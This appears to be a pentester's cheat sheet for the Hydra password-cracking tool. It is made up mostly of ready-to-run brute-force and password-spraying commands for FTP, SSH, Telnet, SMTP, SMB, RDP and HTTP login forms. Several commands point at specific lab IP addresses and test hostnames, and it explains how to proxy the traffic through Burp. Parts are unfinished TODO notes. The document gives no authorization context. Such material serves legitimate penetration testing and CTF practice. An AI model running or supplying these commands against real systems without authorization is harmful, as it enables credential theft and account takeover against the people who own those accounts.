# Hydra
Hydra is a command-line password-cracking tool used to perform brute-force attacks to discover weak passwords

It supports various network protocols and applications such as:

| PROTOCOL | DEFAULT PORT | LINK |
| :----------: | :------: | :--: |
| FTP | 21 | link | 
| SSH | 22 | link | 
| Telnet | 23 | link | 
| SMTP | 25/587 | link | 
| HTTP(s) | 80/443 |link |
| SMB | 139/445 | link |
| RDP | 3389 | link |

The default port can be changed using `-s` flag.

<br>

## Modes
Hydra can be used in different scenarios:
* Password Cracking [Password Brute Force]
```console
hydra -l {KNOWN_USERNAME} -P {PASSWORD_WORDLIST} {TARGET_IP} [CUT]
```

* Password Spraying [Username Brute Force]
```console
hydra -L {USERNAME_WORDLIST} -P {KNOWN_PASSWORD} {TARGET_IP} [CUT]
```

* Username and Password Brute Force
```console
hydra -L {USERNAME_WORDLIST} -P {PASSWORD_WORDLIST} {TARGET_IP} [CUT]
```

<br>

## Protocols
Here a list of hydra commands for the most common protocols

### FTP
```console
hydra -l {USERNAME} -P {WORDLIST} {TARGET_IP} ftp -f
```

### SSH
```console
hydra -l {USERNAME} -P {WORDLIST} {TARGET_ID} ssh -f
```

### Telnet
```console
hydra -l {USERNAME} -P {WORDLIST} {TARGET_ID} telnet -f
```

### SMTP
```console
hydra -l {EMAIL} -P {WORDLIST} {TARGET_EMAIL_SERVER} smtp -S -f
```

### SMB
```console
hydra -l {USERNAME} -P {WORDLIST} {TARGET_ID} smb -f
```

### RDP
```console
hydra -l {USERNAME} -P {WORDLIST} {TARGET_ID} rdp -f
```

### HTTP 
* Basic Authentication
```console
hydra -l {USERNAME} -P {WORDLIST} {TARGET_ID} -s {PORT} http-head {PAYLOAD} -f
```

* Digest Authentication
```console
hydra -l {USERNAME} -P {WORDLIST} {TARGET_ID} -s {PORT} http-get {PAYLOAD} -f
```

* Other Authentication
```console
hydra -l {USERNAME} -P {WORDLIST} {TARGET_ID} -s {PORT} {MODULE} {PAYLOAD} -f
```

where, according to the web server authentication method:

`Module` can assume the following values:
* http-get-form
* http-post-form
* https-get-form
* https-post-form

`Payload` (argument of the module) is a three colon-delimited fields {LOGIN_FORM_LOCATION}:{REQUEST_BODY}:{FAILED_LOGIN_IDENTIFIER} where
* LOGIN_FORM_LOCATION is the path of the login form, such as /secure/login
* REQUEST_BODY is the request body the web server expected
* FAILED_LOGIN_IDENTIFIER is the error response when a login failed (exit condition)

```console
hydra -l admin -P ./rockyou.txt 10.10.10.123 -s 80 http-post-form "/login:j_username=admin&j_password=^PASS^:Incorrect username or password" -f
```

`TODO`
In case of JSON Post Authentication, we need to specify the Content-Type: application/json, maybe with the flag H=

### Post Json Authentication
application/json
hydra -l admin@juice-sh.op -P /usr/share/wordlists/SecLists/Passwords/Common-Credentials/best1050.txt 10.10.174.18 http-post-form "/rest/user/login:email=^USER^&password=^PASS^:Invalid"

# Common Credentials
```console
hydra -L /usr/share/wordlists/SecLists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt 10.129.95.192 -s 80 http-post-form "/:username=^USER^&password=^PASS^:Wrong Credentials" -f 
```
N.B. Hydra will ignore js tags or redirects, taking only strings (es <script>alert("Wrong Credentials")</script>)

## Flags

| OPTIONS | DESCRIPTION | NOTE |
| :------------: | :------------: | ------------ |
| -l | Username | Specifies the username to brute-force | 
| -f | Ends when succeed | The brute-force terminates when an occurrence succeeds |
| -P | Password Wordlist | Password is brute-forced using this wordlist |
| -L | Username Wordlist | Username is brute-forced using this wordlist |
| -C | User+Pass Wordlist | Unique wordlist containing username:password for every line |
| -s | Port | Specifies the port to use |
| -t | Threads | Specifies the number of thread to use | 
| -v | Verbose | Enables verbose mode | 
| -d | Debug | Enables debug mode | 
| -w | Seconds | Specifies the number of seconds to wait between requests | 
| -S | SSL | Performs a connection using SSL |


## Intercept with Proxy
Hydra requests can be inspected using Burp, in order to understand what is wrong about the request.
Hydra needs just the setup of the following environment variable

```console
export HYDRA_PROXY_HTTP=http://127.0.0.1:8080
```

[TODO]
hydra -v -V -L "users.txt" -P "passwords.txt" -s 80 architectureservice.test.com http-post-form "/api/v1/login:{\"username\"\:\"^USER^\",\"password\"\:\"^PASS^\"}:changeFirstName:H=Accept: application/json, text/plain, */*:H=Accept-Language: en-US,en;q=0.5:H=Accept-Encoding: gzip, deflate:H=Referer: http\://architectureclient.test.com/:H=Origin: http\://architectureclient.test.com:H=Connection: keep-alive"


hydra -v -V -L "users.txt" -P "passwords.txt" -s 80 architectureservice.tester.com http-post-form "/api/v1/login:{\"username\"\:\"^USER^\",\"password\"\:\"^PASS^\"}:S=firstName:H=Accept: application/json, text/plain, */*:H=Accept-Language: en-US,en;q=0.5:H=Accept-Encoding: gzip, deflate:H=Referer: http\://architectureclient.tester.com/:H=Origin: http\://architectureclient.tester.com:H=Connection: keep-alive"


